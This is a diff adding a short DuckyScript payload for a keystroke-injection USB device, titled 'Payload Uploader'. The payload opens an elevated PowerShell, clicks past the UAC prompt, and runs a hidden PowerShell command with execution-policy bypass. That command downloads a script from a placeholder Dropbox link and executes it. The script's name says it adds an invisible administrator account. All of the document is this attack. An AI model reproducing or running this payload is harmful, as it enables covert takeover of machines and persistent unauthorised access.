@@ -1,0 +1,25 @@
+REM     Title: Payload Uploader
+REM
+REM     Author: Kira_
+REM
+REM     Description: This payload will download from dropbox & launch your script payload
+REM
+REM     Remember to replace the link with your link for the intended file to download
+REM     Also remember to replace ?dl=0 with ?dl=1 at the end of your link so it is executed properly
+REM
+REM
+REM Start powershell as admin
+GUI r
+DELAY 500
+STRING powershell.exe Start-Process powershell -Verb runAs
+DELAY 500
+ENTER
+DELAY 2000
+LEFT
+DELAY 500
+ENTER
+DELAY 500
+STRING powershell -w h -NoP -NonI -Exec Bypass $pl = iwr "DROPBOX_URL" -Outfile "c:\windows\temp\Add-Invisible-Admin-Account.ps1"; invoke-expression "c:\windows\temp\Add-Invisible-Admin-Account.ps1"
+DELAY 500
+ENTER
+
